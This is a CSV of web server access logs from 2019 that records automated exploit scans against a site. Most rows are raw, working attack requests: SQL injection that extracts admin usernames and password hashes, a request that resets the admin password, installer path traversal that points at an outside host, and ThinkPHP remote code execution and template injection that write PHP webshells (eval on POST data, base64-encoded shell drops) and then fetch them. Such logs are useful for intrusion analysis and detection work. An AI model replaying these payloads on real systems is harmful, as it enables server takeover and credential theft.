IP,Data Size,Date Time,Status,URL,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062457 +0800,200,HEAD,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062457 +0800,200,HEAD plusrecommend.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,916785,03Jun2019062458 +0800,200,GET plusrecommend.phpaid=1&_FILES%5Btype%5D%5Bname%5D&_FILES%5Btype%5D%5Bsize%5D&_FILES%5Btype%5D%5Btype%5D&_FILES%5Btype%5D%5Btmp_name%5D=aa%5C%27and+char(@%60%27%60)+!50000Union+!50000SeLect+1,2,3,concat(0x383839386739617364,group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9%20from%20%60%23@__admin%60%23,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062458 +0800,200,HEAD plussearch.phpkeyword=as&typeArr%5B%20uNion%20%5D=a,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,905475,03Jun2019062459 +0800,200,GET plussearch.phpkeyword=as&typeArr%5B111%3D@%60%5C%5C%5C'%60)+and+(SELECT+1+FROM+(select+count(),concat(floor(rand(0)2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%60%23@__admin%60+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%5C%5C'%60+%5D=a,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062500 +0800,200,HEAD plussearch.phpkeyword=as&typeArr%5B%20uNion%20%5D=a,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,905475,03Jun2019062500 +0800,200,GET plussearch.phpkeyword=as&typeArr%5B111%3D@%60%5C%5C%5C'%60)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%60%23@__admin%60%23@%60%5C%5C%5C'%60+%5D=a
223.111.145.141,,03Jun2019062500 +0800,200,HEAD databackupdatadede_a~2.txt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,906062,03Jun2019062501 +0800,200,GET databackupdatadede_a~2.txt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062502 +0800,200,HEAD databackupdatadede_a~3.txt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,905487,03Jun2019062503 +0800,200,GET databackupdatadede_a~3.txt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062504 +0800,200,HEAD plusdownload.phpopen=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=109&arrs2%5B%5D=105&arrs2%5B%5D=110&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=117&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=61&arrs2%5B%5D=39&arrs2%5B%5D=115&arrs2%5B%5D=112&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=112&arrs2%5B%5D=119&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=61&arrs2%5B%5D=39&arrs2%5B%5D=102&arrs2%5B%5D=50&arrs2%5B%5D=57&arrs2%5B%5D=55&arrs2%5B%5D=97&arrs2%5B%5D=53&arrs2%5B%5D=55&arrs2%5B%5D=97&arrs2%5B%5D=53&arrs2%5B%5D=97&arrs2%5B%5D=55&arrs2%5B%5D=52&arrs2%5B%5D=51&arrs2%5B%5D=56&arrs2%5B%5D=57&arrs2%5B%5D=52&arrs2%5B%5D=97&arrs2%5B%5D=48&arrs2%5B%5D=101&arrs2%5B%5D=52&arrs2%5B%5D=39&arrs2%5B%5D=32&arrs2%5B%5D=119&arrs2%5B%5D=104&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=32&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=61&arrs2%5B%5D=49&arrs2%5B%5D=32&arrs2%5B%5D=35,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,908594,03Jun2019062504 +0800,200,GET plusdownload.phpopen=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=109&arrs2%5B%5D=105&arrs2%5B%5D=110&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=117&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=61&arrs2%5B%5D=39&arrs2%5B%5D=115&arrs2%5B%5D=112&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=112&arrs2%5B%5D=119&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=61&arrs2%5B%5D=39&arrs2%5B%5D=102&arrs2%5B%5D=50&arrs2%5B%5D=57&arrs2%5B%5D=55&arrs2%5B%5D=97&arrs2%5B%5D=53&arrs2%5B%5D=55&arrs2%5B%5D=97&arrs2%5B%5D=53&arrs2%5B%5D=97&arrs2%5B%5D=55&arrs2%5B%5D=52&arrs2%5B%5D=51&arrs2%5B%5D=56&arrs2%5B%5D=57&arrs2%5B%5D=52&arrs2%5B%5D=97&arrs2%5B%5D=48&arrs2%5B%5D=101&arrs2%5B%5D=52&arrs2%5B%5D=39&arrs2%5B%5D=32&arrs2%5B%5D=119&arrs2%5B%5D=104&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=32&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=61&arrs2%5B%5D=49&arrs2%5B%5D=32&arrs2%5B%5D=35,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062505 +0800,200,HEAD installindex.php.bak,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,906010,03Jun2019062506 +0800,200,GET installindex.php.bakstep=11&insLockfile=a&s_lang=a&install_demo_name=..dataadminconfig_update.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062507 +0800,200,HEAD installindex.php.bakstep=11&insLockfile=a&s_lang=a&install_demo_name=..datappx.php&updateHost=httpshuzijiapu.cn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,897053,03Jun2019062507 +0800,200,GET datappx.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062508 +0800,200,HEAD index.phpapiUploadifypreview,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,886917,03Jun2019062509 +0800,200,POST index.phpapiUploadifypreview,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062510 +0800,200,HEAD adminindex.phpc=uploadify&m=include&a=doupfile&lang=cn&metinfonow=qipwtxm&html_filename=1.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,886999,03Jun2019062510 +0800,200,POST adminindex.phpc=uploadify&m=include&a=doupfile&lang=cn&metinfonow=qipwtxm&html_filename=1.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062511 +0800,200,HEAD type.phptemplate=tag_()%7B%7D;@unlink(FILE);assert($_POST%5Bppx%5D)ppxshell;%7B..rss,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,886318,03Jun2019062511 +0800,200,GET datacache_templaterss.tpl.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062513 +0800,200,HEAD index.phpm=member&c=index&a=register&siteid=1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,867055,03Jun2019062513 +0800,200,POST index.phpm=member&c=index&a=register&siteid=1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062513 +0800,200,HEAD SiteServerAjaxajaxOtherService.aspxtype=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,887020,03Jun2019062514 +0800,200,GET SiteFilesSiteTemplatessectestinclude.aspx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062515 +0800,200,HEAD index.phpmoduleactionparam1$%7B@print(eval($_POST%5Bc%5D))%7D,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,886548,03Jun2019062515 +0800,200,GET index.phpmoduleactionparam1$%7B@print(eval($_POST%5Bc%5D))%7D,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062516 +0800,200,HEAD Ueditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,886869,03Jun2019062516 +0800,200,POST Ueditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062517 +0800,200,HEAD Pluginueditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,879773,03Jun2019062518 +0800,200,POST Pluginueditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062519 +0800,200,HEAD Scriptsueditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868893,03Jun2019062519 +0800,200,POST Scriptsueditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062520 +0800,200,HEAD contentUeditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868895,03Jun2019062520 +0800,200,POST contentUeditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062521 +0800,200,HEAD ControlsUeditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868903,03Jun2019062521 +0800,200,POST ControlsUeditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062522 +0800,200,HEAD managerUeditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868891,03Jun2019062523 +0800,200,POST managerUeditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062523 +0800,200,HEAD editorUeditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868879,03Jun2019062524 +0800,200,POST editorUeditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062525 +0800,200,HEAD adminUeditornetcontroller.ashx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868295,03Jun2019062525 +0800,200,POST adminUeditornetcontroller.ashxaction=catchimage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,,03Jun2019062526 +0800,200,HEAD s=index%5Cthink%5Ctemplate%5Cdriver%5Cfilewrite&cacheFile=ppx.php&content=%3Cphp%20eval($_POST%5Bppx%5D);%3Eppxwebshell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
223.111.145.141,868646,03Jun2019062526 +0800,200,GET ppx.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,365,25Nov2019014218 +0800,301,GET s=indexthinktemplatedriverfilewrite&cacheFile=robots1.php&content=xbshellphp%20@eval($_POST[admin]);,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,267,25Nov2019014218 +0800,301,GET robots1.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,629,25Nov2019014218 +0800,301,GET s=indexthinkappinvokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=php%20$poc%20=axsxsxexrxt;$poc_1%20=%20explode(x,%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,265,25Nov2019014218 +0800,301,GET 12345.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,266,25Nov2019014218 +0800,301,GET robots.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,475,25Nov2019014218 +0800,301,GET s=indexthinkappinvokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,261,25Nov2019014218 +0800,301,GET x.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,265,25Nov2019014219 +0800,301,POST index.phps=index,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,400,25Nov2019014219 +0800,301,GET a=fetch&templateFile=publicindex&prefix=''&content=phpfile_put_contents('hmseo.php','php%20@eval($_POST[hm]);hmseo')php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,24179,25Nov2019014220 +0800,200,GET a=fetch&templateFile=publicindex&prefix=''&content=phpfile_put_contents('hmseo.php','php%20@eval($_POST[hm]);hmseo')php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,265,25Nov2019014220 +0800,301,GET hmseo.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,,25Nov2019014220 +0800,301,GET cms.client.phphmseo.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,,25Nov2019014220 +0800,301,GET hmseo.php,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
122.51.141.108,24179,25Nov2019014220 +0800,200,GET,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
110.249.202.53,28068,12Dec2019013325 +0800,200,GET girls178775.html,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
110.249.202.53,17206,12Dec2019044511 +0800,200,GET tag%EA%EB%3C%8E%9E%16L,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
220.243.136.233,17035,14Dec2019051916 +0800,200,GET tag%3C%9D,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
111.225.148.162,17165,14Dec2019064946 +0800,200,GET tag%3C%B8%D5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
111.225.148.134,17176,14Dec2019061132 +0800,200,GET tag%B9%B8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
111.225.148.134,17164,14Dec2019072735 +0800,200,GET tag%3C%DA,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
